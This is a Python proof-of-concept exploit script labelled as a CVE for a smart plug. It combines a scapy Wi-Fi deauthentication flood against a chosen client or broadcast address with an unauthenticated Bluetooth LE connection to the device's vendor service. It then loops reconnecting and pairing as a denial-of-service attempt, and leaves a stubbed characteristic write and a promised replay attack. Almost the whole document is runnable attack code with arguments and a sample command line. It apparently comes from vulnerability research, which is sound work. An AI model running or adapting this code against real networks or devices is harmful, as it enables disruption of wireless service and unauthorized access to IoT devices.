# IMPROPER ACCESS CONTROL // CVE #2


# ETC IMPORTS
import asyncio, argparse, random, threading, time


# BT IMPORTS
from bleak import BleakClient


# WIFI IMPORTS
from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap



MAC = "99:B9:05:1E:35:BC" # <-- MY DEVICE // DEVICE ALSO DOESNT IMPLEMENT RPA (Rotating Private Address) --> MEANING THIS DEVICE USES A STATIC MAC ADDRESS
        #  CHANGE MAC IF NEED        //        THIS CAN FURTHER PERSIST IN ALLOWING THE TARGET TO BE TARGETED INDEFINETLY AFTER OBTAINING MAC ADDRESS ONCE


FD50 = "0000fd50-0000-1000-8000-00805f9b34fb"             # <-- CUSTOM VENDOR SERVICE -->  Vulnerable to little to no security precautions
CHARACTERISTIC_1 = "00000001-0000-1001-8001-00805f9b07d0" # SDP    <-- Properties = write-without-response,write
CHARACTERISTIC_2 = "00000002-0000-1001-8001-00805f9b07d0" # RFCOMM <-- Properties = read
CHARACTERISTIC_3 = "00000003-0000-1001-8001-00805f9b07d0" # UNKOWN <-- Properties = notify


MINE = "sudo venv/bin/python poc.py -i wlan1 -src ee:20:51:38:9f:74 -dst bc:35:1e:05:b9:98"

class POC():
    """Improper Access Control"""



    @classmethod
    def _deauthentication_attack(cls, iface:any, ssid_mac: str, client_mac: str) -> None:
        """This method will perform a layer 3 deauth attack on the target ssid only targetting the client (Smart plug)"""

        
        print("[*] Launching WiFi Deauth Attack!") 
        

        while cls.deauth:

            try:

                reasons = random.choice([4,5,7,15])
                frame = RadioTap() /\
                        Dot11(addr1=client_mac, addr2=ssid_mac, addr3=ssid_mac) /\
                        Dot11Deauth(reason=reasons)
                

                sendp(frame, iface=iface, count=25, verbose=1, realtime=True); time.sleep(2)
            

            except Exception as e:
                print(f"[!] Exception Error: {e}")


    @classmethod
    async def _connect(cls, mac: str, timeout=10):
        """Perform unauthorized connection"""


        print("[*] Attempting BLE connection...")
        


        try:

            client = BleakClient(address_or_ble_device=mac, timeout=timeout, pair=False)

            await client.connect();   print(f"\n[+] Successfully connected to: {mac} ")
            await asyncio.sleep(1) # <-- PROOF THAT USER CAN CONNECT TO TARGET ( Smart plug ) & Stay connected --> CHAIN WITH ANOTHER VULNERABILITIY TO CONTROL DEVICE


            # SPACE FOR FURTHER LOGIC ALLOWING THE USER TO BUILD UPON THIS VULNERABILITY FOR FURTHER EXPLOTATION --> ( REPLAY ATTACK ) <-- COMING SOON 
            

            # THIS CODE BELOW IS FOR TESTING IF I CAN DOS THROUGH BT
            connections = 0
            while True:
                await client.disconnect(); await asyncio.sleep(1)
                await client.connect()   ; await asyncio.sleep(1); connections += 1; 
                await client.pair()
                print(f"[+] connection #{connections}")   
            


            # THIS WILL BE TESTED FURTHER LATER ON 
            payload = ""
            await client.write_gatt_char(CHARACTERISTIC_1, payload)







            await client.disconnect(); print(f"\n[-] Gracefully disconnected!")
        

        except Exception as e:
            print(f"[!] Exception Error: {e}")
            await asyncio.sleep(10)
    


    @classmethod
    def main(cls):
        """Get MAC"""

        cls.deauth = True


        parser = argparse.ArgumentParser()

        parser.add_argument("-m",   required=False, help="Pass target MAC Address (Bluetooth)")
        parser.add_argument("-i",   required=True, help="Pass your iface (WiFi - must be in monitor mode)")
        parser.add_argument("-src", required=True, help="Pass target ssids MAC Address (WiFI)")
        parser.add_argument("-dst", required=False, help="Pass targets MAC Address (WiFi)")


        args = parser.parse_args()
        
        iface      = args.i   or False
        mac        = args.m if args.m else MAC
        ssid_mac   = args.src or False
        client_mac = args.dst or "ff:ff:ff:ff:ff:ff"

        if not mac or not ssid_mac or not iface: print("[!] Pass needed Arguments silly!"); exit()


        # START WiFi DEAUTH
        threading.Thread(target=POC._deauthentication_attack, args=(iface, ssid_mac, client_mac), daemon=True).start()
        
        # START BT REPLAY ATTACK
        asyncio.run(POC._connect(mac=mac))
        


if __name__ == "__main__": 
    POC.main()

